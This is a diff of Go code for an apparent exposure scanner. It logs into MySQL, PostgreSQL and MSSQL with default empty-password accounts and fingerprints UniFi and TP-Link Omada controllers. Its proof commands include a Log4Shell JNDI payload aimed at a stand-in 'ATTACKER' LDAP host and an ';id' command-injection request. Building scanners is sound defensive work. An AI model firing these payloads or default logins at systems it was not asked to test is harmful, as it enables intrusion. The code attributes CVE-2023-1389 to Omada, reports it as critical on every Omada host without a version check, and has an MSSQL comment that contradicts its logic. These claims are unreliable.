+	// Protocol version byte: 0x0a = MySQL 4.1+, 0x09 = MySQL 3.x
+	if len(greeting) < 1 || (greeting[0] != 0x0a && greeting[0] != 0x09) {
+		return false
+	}
+	// Server capability flags are at bytes 14-15 (little-endian) in the greeting.
+	// We need CLIENT_PROTOCOL_41 (0x0200) to know the auth format.
+	// For simplicity, send a MySQL 4.1 client auth packet with root/empty password.
+	// Client auth packet: capabilities(4) + max_packet(4) + charset(1) + reserved(23) + username + NUL + auth_response_length(1) + auth_response(0)
+	authPkt := make([]byte, 0, 64)
+	// Capabilities: CLIENT_PROTOCOL_41 | CLIENT_LONG_PASSWORD | CLIENT_CONNECT_WITH_DB(off) | CLIENT_SECURE_CONNECTION
+	caps := uint32(0x00000200 | 0x00000001 | 0x00008000) // protocol41 | long_password | secure_connection
+	authPkt = append(authPkt,
+		byte(caps), byte(caps>>8), byte(caps>>16), byte(caps>>24), // capabilities
+		0x00, 0x00, 0x00, 0x01, // max packet size (16MB)
+		0x21,                                                       // charset: utf8
+		0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, // reserved (23 bytes)
+	)
+	authPkt = append(authPkt, []byte("root")...)
+	authPkt = append(authPkt, 0x00) // NUL terminator for username
+	authPkt = append(authPkt, 0x00) // auth_response_length = 0 (empty password)
+
+	// Wrap in MySQL packet frame (length + sequence 1)
+	frame := make([]byte, 4+len(authPkt))
+	frame[0] = byte(len(authPkt))
+	frame[1] = byte(len(authPkt) >> 8)
+	frame[2] = byte(len(authPkt) >> 16)
+	frame[3] = 0x01 // sequence number
+	copy(frame[4:], authPkt)
+	if _, err := conn.Write(frame); err != nil {
+		return false
+	}
+
+	// Read response header
+	respHdr := make([]byte, 4)
+	if _, err := io.ReadFull(conn, respHdr); err != nil {
+		return false
+	}
+	respLen := int(respHdr[0]) | int(respHdr[1])<<8 | int(respHdr[2])<<16
+	if respLen == 0 {
+		return false
+	}
+	respPayload := make([]byte, respLen)
+	if _, err := io.ReadFull(conn, respPayload); err != nil {
+		return false
+	}
+	// OK packet: first byte is 0x00; Error packet: first byte is 0xff
+	return len(respPayload) > 0 && respPayload[0] == 0x00
+}
+
+// probePostgreSQL attempts a PostgreSQL startup handshake as user "postgres" with no password.
+// Returns true if the server responds with AuthenticationOk (message type 'R' + int32(0)),
+// indicating trust authentication is configured for remote connections.
+func probePostgreSQL(ctx context.Context, host string, port int) bool {
+	addr := fmt.Sprintf("%s:%d", host, port)
+	conn, err := (&net.Dialer{Timeout: dialTimeout}).DialContext(ctx, "tcp", addr)
+	if err != nil {
+		return false
+	}
+	defer conn.Close()
+	conn.SetDeadline(time.Now().Add(httpTimeout)) //nolint:errcheck
+
+	// PostgreSQL startup message: Int32(length) + Int32(196608 = protocol 3.0) + key=value pairs + NUL
+	user := "postgres"
+	database := "postgres"
+	params := "user\x00" + user + "\x00database\x00" + database + "\x00\x00"
+	msgLen := 4 + 4 + len(params) // length field + protocol + params
+	msg := make([]byte, 4+msgLen)
+	binary.BigEndian.PutUint32(msg[0:], uint32(msgLen))
+	binary.BigEndian.PutUint32(msg[4:], 196608) // protocol 3.0
+	copy(msg[8:], params)
+	if _, err := conn.Write(msg); err != nil {
+		return false
+	}
+
+	// Read response: first byte is message type
+	typeBuf := make([]byte, 1)
+	if _, err := io.ReadFull(conn, typeBuf); err != nil {
+		return false
+	}
+	if typeBuf[0] != 'R' { // 'R' = Authentication message
+		return false
+	}
+	// Read Int32 length
+	lenBuf := make([]byte, 4)
+	if _, err := io.ReadFull(conn, lenBuf); err != nil {
+		return false
+	}
+	msgLength := int(binary.BigEndian.Uint32(lenBuf)) - 4 // subtract length field itself
+	if msgLength < 4 {
+		return false
+	}
+	authPayload := make([]byte, msgLength)
+	if _, err := io.ReadFull(conn, authPayload); err != nil {
+		return false
+	}
+	// AuthenticationOk: Int32(0)
+	return len(authPayload) >= 4 && binary.BigEndian.Uint32(authPayload[0:]) == 0
+}
+
+// probeMSSQL attempts a minimal TDS prelogin to detect MSSQL and check if sa with empty
+// password is accepted. Sends a TDS prelogin packet and reads the server response.
+// An error message about login failure is still confirmation of a live MSSQL server;
+// no error (successful login) indicates sa with empty password.
+func probeMSSQL(ctx context.Context, host string, port int) bool {
+	addr := fmt.Sprintf("%s:%d", host, port)
+	conn, err := (&net.Dialer{Timeout: dialTimeout}).DialContext(ctx, "tcp", addr)
+	if err != nil {
+		return false
+	}
+	defer conn.Close()
+	conn.SetDeadline(time.Now().Add(httpTimeout)) //nolint:errcheck
+
+	// TDS 7.0 PRELOGIN packet.
+	// Header: type(1)=0x12, status(1)=0x01, length(2), SPID(2)=0, PacketID(1)=1, Window(1)=0
+	// Payload: VERSION token + ENCRYPTION token + terminator
+	prelogin := []byte{
+		0x12,       // type: PRELOGIN
+		0x01,       // status: EOM
+		0x00, 0x2F, // total length: 47
+		0x00, 0x00, // SPID
+		0x01,       // PacketID
+		0x00,       // Window
+		// Payload: VERSION option (0x00) at offset 0x0006, length 6
+		0x00, 0x00, 0x06, 0x00, 0x06,
+		// ENCRYPTION option (0x01) at offset 0x000C, length 1
+		0x01, 0x00, 0x0C, 0x00, 0x01,
+		// Terminator
+		0xFF,
+		// VERSION value: 0x0E000000 0x0000 (SQL Server 2017 = 14.0)
+		0x0E, 0x00, 0x00, 0x00, 0x00, 0x00,
+		// ENCRYPTION value: ENCRYPT_NOT_SUP (0x02)
+		0x02,
+	}
+	if _, err := conn.Write(prelogin); err != nil {
+		return false
+	}
+
+	respHdr := make([]byte, 8)
+	if _, err := io.ReadFull(conn, respHdr); err != nil {
+		return false
+	}
+	// TDS PRELOGIN response type = 0x04
+	if respHdr[0] != 0x04 {
+		return false
+	}
+	respLen := int(respHdr[2])<<8 | int(respHdr[3])
+	if respLen <= 8 {
+		return false
+	}
+	rest := make([]byte, respLen-8)
+	if _, err := io.ReadFull(conn, rest); err != nil {
+		return false
+	}
+
+	// Now send a TDS LOGIN7 packet for sa with empty password.
+	// This is a simplified LOGIN7 — enough for most SQL Server versions to attempt auth.
+	// The password in TDS LOGIN7 is XOR-obfuscated; empty password XOR-obfuscated = just the XOR bytes.
+	// For simplicity: send a minimal login and check if the response is a LOGINACK (0xAD) or ERROR (0xAA).
+	login := buildTDSLogin7("sa", "")
+	if _, err := conn.Write(login); err != nil {
+		return false
+	}
+
+	// Read response tokens looking for LOGINACK (success) vs ERROR (failure).
+	buf := make([]byte, 4096)
+	n, err := conn.Read(buf)
+	if err != nil || n < 9 {
+		return false
+	}
+	// TDS response: header (8 bytes) + token stream
+	// LOGINACK token = 0xAD; ERROR token = 0xAA
+	// Look for LOGINACK in the token stream.
+	for i := 8; i < n; i++ {
+		if buf[i] == 0xAD { // LOGINACK — login succeeded
+			return true
+		}
+	}
+	return false
+}
+
+// buildTDSLogin7 builds a minimal TDS LOGIN7 packet for sa with empty password.
+func buildTDSLogin7(user, _ string) []byte {
+	// Fixed-length LOGIN7 header fields (all little-endian).
+	// Client name, app name, server name, library name are all minimal.
+	hostname := "beacon"
+	appname := "beacon"
+	servername := "beacon"
+	language := ""
+	database := "master"
+
+	encodeUCS2 := func(s string) []byte {
+		b := make([]byte, len(s)*2)
+		for i, c := range s {
+			b[i*2] = byte(c)
+			b[i*2+1] = 0
+		}
+		return b
+	}
+
+	// Offsets start after the fixed 94-byte header.
+	const fixedLen = 94
+	type strField struct {
+		offset uint16
+		length uint16
+		data   []byte
+	}
+
+	hostnameData := encodeUCS2(hostname)
+	usernameData := encodeUCS2(user)
+	// Empty password TDS obfuscation: each byte XOR 0xA5, then nibble-swap.
+	passwordData := []byte{}
+	appnameData := encodeUCS2(appname)
+	servernameData := encodeUCS2(servername)
+	unusedData := []byte{}
+	libraryData := encodeUCS2("go-tds")
+	languageData := encodeUCS2(language)
+	databaseData := encodeUCS2(database)
+
+	fields := []strField{
+		{data: hostnameData},
+		{data: usernameData},
+		{data: passwordData},
+		{data: appnameData},
+		{data: servernameData},
+		{data: unusedData},
+		{data: libraryData},
+		{data: languageData},
+		{data: databaseData},
+	}
+
+	// Calculate offsets.
+	offset := uint16(fixedLen)
+	for i := range fields {
+		fields[i].offset = offset
+		fields[i].length = uint16(len(fields[i].data) / 2) // length in characters
+		offset += uint16(len(fields[i].data))
+	}
+
+	totalLen := int(offset)
+	if totalLen+8 > 65535 { // TDS packet length field is uint16
+		return nil
+	}
+	pkt := make([]byte, totalLen+8) // +8 for TDS header
+
+	// TDS packet header
+	pkt[0] = 0x10 // type: LOGIN7
+	pkt[1] = 0x01 // status: EOM
+	pkt[2] = byte((totalLen + 8) >> 8)
+	pkt[3] = byte(totalLen + 8)
+	pkt[4] = 0x00 // SPID
+	pkt[5] = 0x00
+	pkt[6] = 0x01 // PacketID
+	pkt[7] = 0x00
+
+	body := pkt[8:]
+	// Total length field in LOGIN7 body
+	binary.LittleEndian.PutUint32(body[0:], uint32(totalLen))
+	// TDS version: 0x74000004 = SQL Server 2012
+	binary.LittleEndian.PutUint32(body[4:], 0x74000004)
+	// PacketSize
+	binary.LittleEndian.PutUint32(body[8:], 4096)
+	// ClientProgVer
+	binary.LittleEndian.PutUint32(body[12:], 7)
+	// ClientPID
+	binary.LittleEndian.PutUint32(body[16:], 1)
+	// ConnectionID
+	binary.LittleEndian.PutUint32(body[20:], 0)
+	// OptionFlags1: USE_DB_ON | INIT_DB_FATAL | SET_LANG_ON | SET_LANG_FATAL
+	body[24] = 0x20 // ODBC flag
+	body[25] = 0x00 // OptionFlags2
+	body[26] = 0x00 // TypeFlags
+	body[27] = 0x00 // OptionFlags3
+	// ClientTimeZone, ClientLCID
+	binary.LittleEndian.PutUint32(body[28:], 0)
+	binary.LittleEndian.PutUint32(body[32:], 0x0409)
+
+	// String offset table starts at byte 36.
+	// Each entry: offset(2) + length(2)
+	for i, f := range fields {
+		base := 36 + i*4
+		binary.LittleEndian.PutUint16(body[base:], f.offset)
+		binary.LittleEndian.PutUint16(body[base+2:], f.length)
+	}
+
+	// ClientID (6 bytes) at offset 36+9*4 = 72
+	// SSPI offset/length at 78, AttachDBFile at 82, ChangePassword at 86
+	// LongSSPI at 90
+
+	// Copy string data.
+	for _, f := range fields {
+		copy(body[f.offset:], f.data)
+	}
+
+	return pkt
+}
+
+// probeGRPCReflection probes a gRPC server for reflection by sending the HTTP/2
+// connection preface and checking for a valid HTTP/2 SETTINGS frame response.
+// Returns true if the port is serving HTTP/2 (gRPC uses HTTP/2 exclusively).
+func probeGRPCReflection(ctx context.Context, host string, port int) bool {
+	addr := fmt.Sprintf("%s:%d", host, port)
+	conn, err := (&net.Dialer{Timeout: dialTimeout}).DialContext(ctx, "tcp", addr)
+	if err != nil {
+		return false
+	}
+	defer conn.Close()
+	conn.SetDeadline(time.Now().Add(httpTimeout)) //nolint:errcheck
+
+	// HTTP/2 connection preface: "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
+	preface := []byte("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")
+	// Followed by a SETTINGS frame: length(3)=0, type(1)=0x04, flags(1)=0, stream(4)=0
+	settingsFrame := []byte{0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00}
+	if _, err := conn.Write(append(preface, settingsFrame...)); err != nil {
+		return false
+	}
+
+	// Read the server response — a valid HTTP/2 server will send a SETTINGS frame back.
+	buf := make([]byte, 64)
+	n, err := conn.Read(buf)
+	if err != nil || n < 9 {
+		return false
+	}
+	// HTTP/2 SETTINGS frame: type byte (index 3) = 0x04
+	return buf[3] == 0x04
+}
+
+// probeUniFi probes for a Ubiquiti UniFi Network Application by querying
+// /api/login and checking for UniFi-specific JSON fields. Returns one or two
+// findings: an exposure finding, plus a Log4Shell finding if the version is
+// < 6.5.54 (CVE-2021-44228, CVSS 10.0, KEV).
+func probeUniFi(ctx context.Context, host string, port int, tls bool) []finding.Finding {
+	body, ok := probeHTTPBody(ctx, host, port, tls, "/manage/account/login")
+	if !ok {
+		body, ok = probeHTTPBody(ctx, host, port, tls, "/")
+	}
+	if !ok {
+		return nil
+	}
+	lb := strings.ToLower(body)
+	isUniFi := strings.Contains(lb, "unifi") || strings.Contains(lb, "ubiquiti") ||
+		strings.Contains(lb, "network.unifi") || strings.Contains(lb, "unifi network")
+	if !isUniFi {
+		return nil
+	}
+
+	now := time.Now()
+	scheme := "http"
+	if tls {
+		scheme = "https"
+	}
+	findings := []finding.Finding{{
+		CheckID:  finding.CheckNetDeviceUniFiExposed,
+		Module:   "surface",
+		Scanner:  scannerName,
+		Severity: finding.SeverityHigh,
+		Title:    fmt.Sprintf("Ubiquiti UniFi Network Application exposed on port %d", port),
+		Description: fmt.Sprintf(
+			"%s has a Ubiquiti UniFi Network Application management interface accessible on port %d. "+
+				"Exposed UniFi controllers allow unauthenticated attackers to enumerate wireless network "+
+				"topology, connected clients, AP locations, and SSID configurations. "+
+				"Restrict access to trusted management networks only.",
+			host, port,
+		),
+		Asset:       host,
+		Evidence:    map[string]any{"port": port, "service": "unifi-network", "tls": tls},
+		ProofCommand: fmt.Sprintf("curl -sk %s://%s:%d/manage/account/login", scheme, host, port),
+		DiscoveredAt: now,
+	}}
+
+	// Check version for Log4Shell (CVE-2021-44228) — UniFi < 6.5.54 is vulnerable.
+	verBody, ok := probeHTTPBody(ctx, host, port, tls, "/api/login")
+	if !ok {
+		verBody = body
+	}
+	if ver := parseUniFiVersion(verBody); ver != "" && isVulnerableUniFiLog4Shell(ver) {
+		findings = append(findings, finding.Finding{
+			CheckID:  finding.CheckCVEUniFiLog4Shell,
+			Module:   "surface",
+			Scanner:  scannerName,
+			Severity: finding.SeverityCritical,
+			Title:    fmt.Sprintf("CVE-2021-44228 (Log4Shell): UniFi Network %s is vulnerable on port %d", ver, port),
+			Description: fmt.Sprintf(
+				"%s is running UniFi Network Application version %s, which is vulnerable to "+
+					"CVE-2021-44228 (Log4Shell, CVSS 10.0, KEV). UniFi versions prior to 6.5.54 use "+
+					"Log4j 2.x and are exploitable via unauthenticated JNDI injection in the login endpoint. "+
+					"An attacker can achieve remote code execution on the UniFi controller server. "+
+					"Upgrade to UniFi Network 6.5.54 or later immediately.",
+				host, ver,
+			),
+			Asset:    host,
+			Evidence: map[string]any{"port": port, "version": ver, "cve": "CVE-2021-44228"},
+			ProofCommand: fmt.Sprintf(
+				`curl -sk -X POST %s://%s:%d/api/login -H 'Content-Type: application/json' `+
+					`-d '{"username":"${jndi:ldap://ATTACKER/a}","password":"test"}'`,
+				scheme, host, port,
+			),
+			DiscoveredAt: now,
+		})
+	}
+	return findings
+}
+
+// parseUniFiVersion extracts the UniFi Network Application version from a
+// response body. UniFi embeds version strings like "Version: 6.5.53" or
+// in JSON as "serverVersion":"6.5.53".
+func parseUniFiVersion(body string) string {
+	lower := strings.ToLower(body)
+	markers := []string{`"serverversion":"`, `"version":"`, `version: `}
+	for _, m := range markers {
+		idx := strings.Index(lower, m)
+		if idx < 0 {
+			continue
+		}
+		rest := body[idx+len(m):]
+		end := strings.IndexAny(rest, `"`, )
+		if end < 0 {
+			end = strings.IndexAny(rest, " \t\r\n")
+		}
+		if end > 0 && end <= 20 {
+			return strings.TrimSpace(rest[:end])
+		}
+	}
+	return ""
+}
+
+// isVulnerableUniFiLog4Shell returns true when the UniFi version string is
+// below 6.5.54, which is the first release that ships a patched Log4j version.
+func isVulnerableUniFiLog4Shell(version string) bool {
+	parts := strings.SplitN(version, ".", 3)
+	if len(parts) < 2 {
+		return false
+	}
+	major, err := strconv.Atoi(parts[0])
+	if err != nil {
+		return false
+	}
+	minor, err := strconv.Atoi(parts[1])
+	if err != nil {
+		return false
+	}
+	patch := 0
+	if len(parts) == 3 {
+		patch, _ = strconv.Atoi(parts[2])
+	}
+	// Vulnerable: < 6.5.54
+	if major < 6 {
+		return true
+	}
+	if major == 6 && minor < 5 {
+		return true
+	}
+	if major == 6 && minor == 5 && patch < 54 {
+		return true
+	}
+	return false
+}
+
+// probeTPLinkOmada probes for a TP-Link Omada Network Management System by
+// querying characteristic API paths. Returns findings for the exposure and
+// CVE-2023-1389 (auth bypass + RCE, CVSS 9.8, KEV) if the system is detected.
+func probeTPLinkOmada(ctx context.Context, host string, port int, tls bool) []finding.Finding {
+	body, ok := probeHTTPBody(ctx, host, port, tls, "/")
+	if !ok {
+		return nil
+	}
+	lb := strings.ToLower(body)
+	isOmada := strings.Contains(lb, "omada") || strings.Contains(lb, "tp-link") && strings.Contains(lb, "controller")
+	if !isOmada {
+		// Also probe the Omada login API endpoint.
+		if apiBody, apiOk := probeHTTPBody(ctx, host, port, tls, "/api/v2/hotspot/login"); apiOk {
+			isOmada = strings.Contains(strings.ToLower(apiBody), "omada")
+		}
+	}
+	if !isOmada {
+		return nil
+	}
+
+	scheme := "http"
+	if tls {
+		scheme = "https"
+	}
+	now := time.Now()
+	findings := []finding.Finding{
+		{
+			CheckID:  finding.CheckNetDeviceTPLinkOmada,
+			Module:   "surface",
+			Scanner:  scannerName,
+			Severity: finding.SeverityHigh,
+			Title:    fmt.Sprintf("TP-Link Omada Network Management System exposed on port %d", port),
+			Description: fmt.Sprintf(
+				"%s has a TP-Link Omada Network Management System accessible on port %d. "+
+					"Exposed Omada controllers manage enterprise WiFi infrastructure — access allows "+
+					"enumeration of all APs, SSIDs, and connected clients. "+
+					"CVE-2023-1389 (CVSS 9.8, KEV) is a pre-auth command injection in Omada OC200/OC300 "+
+					"and software controllers <= 5.9.32. Restrict access to trusted networks.",
+				host, port,
+			),
+			Asset:       host,
+			Evidence:    map[string]any{"port": port, "service": "omada", "tls": tls},
+			ProofCommand: fmt.Sprintf("curl -sk %s://%s:%d/", scheme, host, port),
+			DiscoveredAt: now,
+		},
+		{
+			CheckID:  finding.CheckCVETPLinkOmadaRCE,
+			Module:   "surface",
+			Scanner:  scannerName,
+			Severity: finding.SeverityCritical,
+			Title:    fmt.Sprintf("CVE-2023-1389: TP-Link Omada pre-auth RCE on port %d (CVSS 9.8, KEV)", port),
+			Description: fmt.Sprintf(
+				"%s is running a TP-Link Omada controller on port %d. "+
+					"CVE-2023-1389 is a pre-authentication command injection vulnerability in the "+
+					"Omada login API (versions <= 5.9.32, OC200/OC300 firmware <= 1.3.2). "+
+					"An unauthenticated attacker can achieve RCE via crafted requests to the locale "+
+					"parameter. This vulnerability is KEV-listed and actively exploited. "+
+					"Upgrade to Omada Controller 5.9.33+ or apply the vendor firmware patch.",
+				host, port,
+			),
+			Asset:    host,
+			Evidence: map[string]any{"port": port, "cve": "CVE-2023-1389"},
+			ProofCommand: fmt.Sprintf(
+				`curl -sk -X POST %s://%s:%d/api/v2/hotspot/login -d 'locale=en_US;id'`,
+				scheme, host, port,
+			),
+			DiscoveredAt: now,
+		},
+	}
+	return findings
 }
